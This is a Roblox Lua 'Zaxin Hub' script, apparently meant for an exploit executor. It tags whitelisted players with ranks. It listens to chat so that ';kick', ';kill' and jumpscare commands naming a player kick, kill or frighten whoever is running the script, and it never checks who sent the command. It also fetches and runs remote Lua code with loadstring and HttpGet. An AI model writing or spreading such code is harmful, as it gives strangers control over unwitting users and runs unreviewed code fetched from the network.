--// =========================
--// ZAXIN HUB - SCRIPT FINAL
--// =========================

--// Serviços
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local TextChatService = game:GetService("TextChatService")
local RunService = game:GetService("RunService")

local LocalPlayer = Players.LocalPlayer

--// =========================
--// WHITELIST / RANKS
--// =========================
local WhiteList = {
    ["10pereirazzk"] = "Owner",
    ["Zelaojg"] = "Parceiro",
    ["joaoluizzx"] = "Staff",
    ["itz_starUwUspice"] = "Usuário-Admin",
    ["tiai200"] = "Usuário-Admin",
    ["nao"] = "Staff",
}

--// =========================
--// JUMPSCARES
--// =========================
local JUMPSCARES = {
    { Name = ";jumps1", ImageId = "rbxassetid://126754882337711", AudioId = "rbxassetid://138873214826309" },
    { Name = ";jumps2", ImageId = "rbxassetid://86379969987314",  AudioId = "rbxassetid://143942090" },
    { Name = ";jumps3", ImageId = "rbxassetid://127382022168206", AudioId = "rbxassetid://143942090" },
    { Name = ";jumps4", ImageId = "rbxassetid://95973611964555",  AudioId = "rbxassetid://138873214826309" },
}

--// =========================
--// TAG ACIMA DA CABEÇA
--// =========================
local runningLoops = {}

local function createBillboard(player, text, guiName)
    if not player.Character then return end
    local head = player.Character:FindFirstChild("Head")
    if not head or head:FindFirstChild(guiName) then return end

    local billboard = Instance.new("BillboardGui")
    billboard.Name = guiName
    billboard.Adornee = head
    billboard.Size = UDim2.new(0, 120, 0, 40)
    billboard.StudsOffset = Vector3.new(0, 2.5, 0)
    billboard.AlwaysOnTop = true
    billboard.Parent = head

    local frame = Instance.new("Frame", billboard)
    frame.Size = UDim2.new(1, 0, 1, 0)
    frame.BackgroundColor3 = Color3.fromRGB(128, 0, 255)
    frame.BackgroundTransparency = 0.25
    frame.BorderSizePixel = 0

    Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 10)

    local label = Instance.new("TextLabel", frame)
    label.Size = UDim2.new(1, 0, 1, 0)
    label.BackgroundTransparency = 1
    label.Text = text
    label.TextColor3 = Color3.new(1, 1, 1)
    label.Font = Enum.Font.GothamBold
    label.TextScaled = true
end

local function startTag(player, rank)
    local guiName = "ZaxinRank_" .. player.Name
    if runningLoops[guiName] then return end
    runningLoops[guiName] = true

    task.spawn(function()
        while runningLoops[guiName] do
            createBillboard(player, rank, guiName)
            task.wait(1)
        end
    end)
end

--// Aplica tags
for _, plr in ipairs(Players:GetPlayers()) do
    local rank = WhiteList[plr.Name]
    if rank then
        startTag(plr, rank)
    end
end

Players.PlayerAdded:Connect(function(plr)
    task.wait(2)
    local rank = WhiteList[plr.Name]
    if rank then
        startTag(plr, rank)
    end
end)

--// =========================
--// JUMPSCARE LOCAL
--// =========================
local function ShowJumpscare(imageId, audioId)
    local gui = Instance.new("ScreenGui", LocalPlayer:WaitForChild("PlayerGui"))
    gui.IgnoreGuiInset = true
    gui.ResetOnSpawn = false

    local img = Instance.new("ImageLabel", gui)
    img.Size = UDim2.new(1, 0, 1, 0)
    img.BackgroundTransparency = 1
    img.Image = imageId
    img.ImageTransparency = 1

    local sound = Instance.new("Sound", workspace)
    sound.SoundId = audioId
    sound.Volume = 5
    sound:Play()
    game.Debris:AddItem(sound, 5)

    TweenService:Create(img, TweenInfo.new(0.4), {ImageTransparency = 0}):Play()
    task.wait(2)
    TweenService:Create(img, TweenInfo.new(0.4), {ImageTransparency = 1}):Play()
    task.wait(0.5)

    gui:Destroy()
end

--// =========================
--// COMANDOS VIA CHAT
--// =========================
local function OnCommand(text, author)
    local myName = LocalPlayer.Name:lower()

    for _, js in ipairs(JUMPSCARES) do
        if text == js.Name .. " " .. myName then
            ShowJumpscare(js.ImageId, js.AudioId)
        end
    end

    if text == ";kick " .. myName then
        LocalPlayer:Kick("Expulso pelo Zaxin Hub")
    end

    if text == ";kill " .. myName then
        if LocalPlayer.Character then
            LocalPlayer.Character:BreakJoints()
        end
    end
end

--// Conecta novo chat
local function ConnectChat(channel)
    channel.MessageReceived:Connect(function(msg)
        if msg.Text then
            OnCommand(msg.Text:lower(), msg.TextSource and msg.TextSource.Name)
        end
    end)
end

for _, ch in ipairs(TextChatService.TextChannels:GetChildren()) do
    if ch:IsA("TextChannel") then
        ConnectChat(ch)
    end
end

TextChatService.TextChannels.ChildAdded:Connect(function(ch)
    if ch:IsA("TextChannel") then
        ConnectChat(ch)
    end
end)

--// =========================
--// UI (APENAS WHITELIST)
--// =========================
if WhiteList[LocalPlayer.Name] then
    local WindUI = loadstring(game:HttpGet(
        "https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"
    ))()

    local Window = WindUI:CreateWindow({
        Title = "Zaxin Hub | Admin",
        Author = "ZaxinX",
        Folder = "ZaxinHub",
        Size = UDim2.fromOffset(560, 420),
    })

    local Tab = Window:Tab({ Title = "Info", Icon = "shield" })
    Tab:Label({ Title = "Zaxin Hub carregado com sucesso" })
end

--// =========================
--// SOM DE LOAD
--// =========================
local s = Instance.new("Sound", workspace)
s.SoundId = "rbxassetid://8486683243"
s.Volume = 2
s:Play()
game.Debris:AddItem(s, 5)
